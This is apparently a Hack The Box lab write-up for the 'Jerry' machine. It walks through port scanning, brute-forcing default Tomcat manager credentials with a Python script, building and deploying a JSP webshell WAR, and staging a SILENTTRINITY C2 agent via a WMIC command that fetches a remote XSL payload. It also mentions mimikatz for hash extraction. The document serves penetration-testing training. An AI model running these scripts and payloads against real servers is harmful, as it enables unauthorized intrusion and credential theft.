@@ -1,0 +1,145 @@
+Jerry
+
+11th November 2018 / Document No D18.100.27
+
+Prepared By: egre55
+Machine Author: mr_h4sh
+Difficulty: Easy
+Classification: Official
+
+                                                                        Page 1 / 10
+SYNOPSIS
+
+Although Jerry is one of the easier machines on Hack The Box, it is realistic as Apache Tomcat is
+often found exposed and configured with common or weak credentials.
+
+Skills Required                             Skills Learned
+
+     Basic Python/Ruby etc. or familiarity       Basic script debugging
+         with web brute force attack tools       Custom war file payload creation
+                                                 SILENTTRINITY post-exploitation
+
+                                                     framework installation and usage
+                                                     (courtesy of I ppSec Jerry video)
+
+                                            Page 2 / 10
+Enumeration
+Nmap
+
+masscan -p1-65535 10.10.10.95 --rate=1000 -e tun0 > ports
+ports=$(cat ports | awk -F " " '{print $4}' | awk -F "/" '{print $1}' | sort -n | tr '\n' ',' | sed 's/,$//')
+nmap -Pn -sV -sC -p$ports 10.10.10.95
+
+Nmap reveals an Apache Tomcat installation on the default port, and visual inspection reveals
+that the HTML Web Manager application "/manager/html" is accessible.
+
+                                                                                                                  Page 3 / 10
+Identification of Valid Credentials
+
+Is it worth trying to login with default or common credentials, and @danielmiessler's SecLists
+contains a comprehensive list of Tomcat credentials.
+https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Default-Credentials
+/tomcat-betterdefaultpasslist.txt
+As this list contains 79 credentials it is worth scripting some automation, or using a brute force
+tool such as hydra.
+The script "tomcat-brute.py" ( Appendix A) is used, which reveals that a username of "tomcat"
+and password of "s3cret" are valid.
+
+                                                                                                                  Page 4 / 10
+Exploitation
+Creation of WAR File
+
+The script "make-war.sh", see ( Appendix B) can be used to create a WAR file. The "jsp File
+browser 1.2" by Boris von Loesch can be used to enumerate the file system and execute system
+commands.
+https://raw.githubusercontent.com/tennc/webshell/master/jsp/jspbrowser/Browser.jsp
+
+                                                                                                                  Page 5 / 10
+Deployment of Webshell
+
+After logging in to the Web Manager, and deploying the WAR file using the "WAR file to deploy"
+section, the "wshell" application is visible.
+
+Clicking on this link brings up the webshell.
+The webshell can now be upgraded to a SILENTTRINITY agent. SILENTTRINITY is a new
+post-exploitation agent powered by Python, IronPython, C#/.NET made by @byt3bl33d3r.
+IppSec demonstrates this framework in the Jerry video https://youtu.be/-O3SPrYhAMo, and this is
+replicated in the section below.
+
+                                                                                                                  Page 6 / 10
+Post-Exploitation
+
+Upgrading to SILENTTRINITY Agent
+
+SILENTTRINITY can be installed as follows.
+cd /opt
+git clone https://github.com/byt3bl33d3r/SILENTTRINITY
+apt-get install python3.7-dev python3-pip
+cd SILENTTRINITY/Server/
+python3.7 -m pip install -r requirements.txt
+
+Make a minor change to http.py to comment out line 66 - thanks to @yaap7for the workaround.
+https://github.com/byt3bl33d3r/SILENTTRINITY/issues/6
+vi /opt/SILENTTRINITY/Server/listeners/http.py
+
+The SILENTTRINITY server can now be started and configured.
+python3.7 st.py 2> /dev/null
+ST (listeners)  use http
+ST (listeners)(http)  set BindIP 10.10.14.10
+ST (listeners)(http)  start
+[+] Listener 'http' started successfully!
+ST (listeners)(http)  Running on https://10.10.14.10:443 (CTRL + C to quit)
+ST (listeners)(http)  stagers
+ST (stagers)  use wmic
+ST (stagers)(wmic)  generate http
+[+] Generated stager to wmic.xsl
+[*] Launch with:
+C:\Windows\System32\wbem\WMIC.exe os get /format:"https://myurl/wmic.xsl"
+
+                                                                                                                  Page 7 / 10
+Extraction of Administrator NTLM hash
+
+SILENTTRINITY supports many options, such as mimikatz and execute-assembly.
+
+                                                                                                                  Page 8 / 10
+Appendix A
+
+#!/usr/bin/env python
+import sys
+import requests
+with open('tomcat-betterdefaultpasslist.txt') as f:
+
+         for line in f:
+                   c = line.strip('\n').split(":")
+                   r = requests.get('http://10.10.10.95:8080/manager/html', auth=(c[0], c[1]))
+
+            if r.status_code == 200:
+                     print "Found valid credentials \"" + line.strip('\n') + "\""
+                     raise sys.exit()
+
+                                                                                   tomcat-brute.py
+
+                                                                                   Page 9 / 10
+Appendix B
+
+#!/bin/sh
+
+wget https://raw.githubusercontent.com/tennc/webshell/master/jsp/jspbrowser/Browser.jsp -O
+index.jsp
+
+rm -rf wshell
+
+rm -f wshell.war
+
+mkdir wshell
+
+cp index.jsp wshell/
+
+cd wshell
+
+jar -cvf ../wshell.war *
+
+                          make-war.sh
+
+                          Page 10 / 10
+
